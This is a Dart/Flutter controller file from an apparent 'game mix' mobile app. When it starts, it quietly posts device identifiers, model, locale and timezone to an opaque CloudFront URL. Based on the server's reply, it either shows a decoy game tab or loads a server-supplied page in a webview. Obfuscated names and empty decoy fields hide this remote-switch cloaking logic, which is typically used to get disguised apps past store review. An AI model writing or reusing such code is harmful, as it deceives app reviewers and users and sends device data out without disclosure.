import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class GameMixConfigLogic extends GetxController {

  var ptmsaixq = RxBool(false);
  var qhxldkvgme = RxBool(true);
  var pcenblqs = RxString("");
  var rolando = RxBool(false);
  var swaniawski = RxBool(true);
  final sjufopt = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ltwrg();
  }


  Future<void> ltwrg() async {
    rolando.value = true;
    swaniawski.value = true;
    qhxldkvgme.value = false;

    sjufopt.post("https://dxihm7k1k2059.cloudfront.net/L89wlIa",data: await ngokfl()).then((value) {
      var egbtwc = value.data["egbtwc"] as String;
      var iuqm = value.data["iuqm"] as bool;
      if (iuqm) {
        pcenblqs.value = egbtwc;
        amy();
      } else {
        schaefer();
      }
    }).catchError((e) {
      qhxldkvgme.value = true;
      swaniawski.value = true;
      rolando.value = false;
    });
  }

  Future<Map<String, dynamic>> ngokfl() async {
    final DeviceInfoPlugin smoh = DeviceInfoPlugin();
    PackageInfo fzeqo_ciwhm = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var pgxjcv = Platform.localeName;
    var sYbf = currentTimeZone;

    var ejTM = fzeqo_ciwhm.packageName;
    var qMwe = fzeqo_ciwhm.version;
    var KxetwcG = fzeqo_ciwhm.buildNumber;

    var jTERYsF = fzeqo_ciwhm.appName;
    var MXGl = "";
    var OMexzJn  = "";
    var aOBDLVWJ = "";
    var rogersRath = "";
    var dedrickDare = "";
    var josephCarroll = "";
    var frankMann = "";
    var amelyCremin = "";


    var BFMKqRc = "";
    var VxWv = false;

    if (GetPlatform.isAndroid) {
      BFMKqRc = "android";
      var tiwbpyjfr = await smoh.androidInfo;

      aOBDLVWJ = tiwbpyjfr.brand;

      MXGl  = tiwbpyjfr.model;
      OMexzJn = tiwbpyjfr.id;

      VxWv = tiwbpyjfr.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      BFMKqRc = "ios";
      var hspvmod = await smoh.iosInfo;
      aOBDLVWJ = hspvmod.name;
      MXGl = hspvmod.model;

      OMexzJn = hspvmod.identifierForVendor ?? "";
      VxWv  = hspvmod.isPhysicalDevice;
    }
    var res = {
      "jTERYsF": jTERYsF,
      "frankMann" : frankMann,
      "qMwe": qMwe,
      "aOBDLVWJ": aOBDLVWJ,
      "ejTM": ejTM,
      "BFMKqRc": BFMKqRc,
      "MXGl": MXGl,
      "josephCarroll" : josephCarroll,
      "sYbf": sYbf,
      "OMexzJn": OMexzJn,
      "pgxjcv": pgxjcv,
      "KxetwcG": KxetwcG,
      "VxWv": VxWv,
      "rogersRath" : rogersRath,
      "dedrickDare" : dedrickDare,
      "amelyCremin" : amelyCremin,

    };
    return res;
  }

  Future<void> schaefer() async {
    Get.offNamed("/game_mix_tab");
  }

  Future<void> amy() async {
    Get.offNamed("/game_mix_grid_col");
  }

}
